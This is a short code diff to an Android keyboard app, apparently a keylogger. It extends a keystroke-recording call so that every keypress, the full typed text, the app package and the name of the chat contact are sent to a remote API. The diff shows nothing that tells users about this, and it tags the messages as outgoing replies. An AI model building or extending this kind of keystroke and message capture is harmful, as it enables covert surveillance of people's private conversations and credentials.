@@ -1014,12 +1014,15 @@ class KeyboardIME : InputMethodService() {
         pendingRecordKey = null
         pendingRecordAction = null
         val appPackage = currentInputEditorInfo?.packageName ?: "unknown"
+        val contact = ChatContextHolder.contactName
+        val recordAction = if (contact.isNotBlank() && action != "incoming") "reply" else action
         apiClient.recordKeystroke(
-            deviceUniqueId = deviceUniqueId,
             keyPressed = keyPressed,
             fullText = currentText.toString(),
             appPackage = appPackage,
-            action = action
+            action = recordAction,
+            contactName = contact,
+            direction = "outgoing"
         )
     }
 
